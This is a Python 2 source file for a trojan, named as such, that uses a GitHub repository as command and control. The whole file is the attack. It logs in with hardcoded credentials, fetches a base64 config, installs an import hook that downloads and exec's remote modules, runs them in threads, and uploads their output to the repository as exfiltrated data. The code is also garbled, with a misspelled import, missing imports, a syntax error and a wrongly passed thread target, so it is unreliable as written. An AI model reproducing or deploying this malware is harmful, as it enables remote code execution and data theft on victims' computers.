import sys
import ramdom
import imp
import threading
import time
from github3 import login

trojan_id = "belajar"
trojan_config = "%s.json" %(trojan_id)
configured = True
have_task = False


def connect_github():
	gh = login(username="advancenetprog",password="advnetprog1")
	repo = gh.repository("advancenetprog","belajar")
	brach = repo.brach("master")

	return gh,repo,brach

def get_file_content(filepath):
	gh ,repo,brach= connect_github()
	tree = brach.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print " Found file %s" %(filepath)
			blob = repo.blob(filename._json_data["sha"])
			return blob.content
	return None

def get_trojan_config():
	global configured
	config_json = get_file_content(trojan_config)
	config = json.loads(base64.b64decode(config_json))
	configured = True

	for task in config:
		if task["module"] not in sys.modules:
			exec("import %s" %task["module"])
	return config

def store_module_data(data):
	print "storing %s" %(data)
	gh ,repo,brach = connect_github()
	path = "data/%s/%s.data" %(trojan_id,random.randint(1,100000))
	repo.create_file(path," commit data komputer" , base64.b64encode(data))
	return

class GitImporter(object):
	def __init__(self):
		self.current_module= ""

	def find_module(self, fullname, path=None):
		if configured:
			new_lib = get_file_content("module/%s" %fullname)
			if new_lib is not None:
				self.current_module = base64.b64decode(new_lib)
				return self
		return None

	def load_module(self,name):
		module = imp.new_module(name)
		exec self.current_module in module.__dict__
		sys.modules[name] = module
		return module

def module_runner(name_module):
	global have_task
	have_task = True
	result = sys.modules[name_module].run()
	have_task = False
	store_module_data(result)
	return

sys.meta_path = [GitImporter()]

config = get_trojan_config()

while True:
	if not have_task:
		for task in config
			t = threading.Thread(target="module_runner", args=(task["module"],))
			t.start()
			time.sleep(5)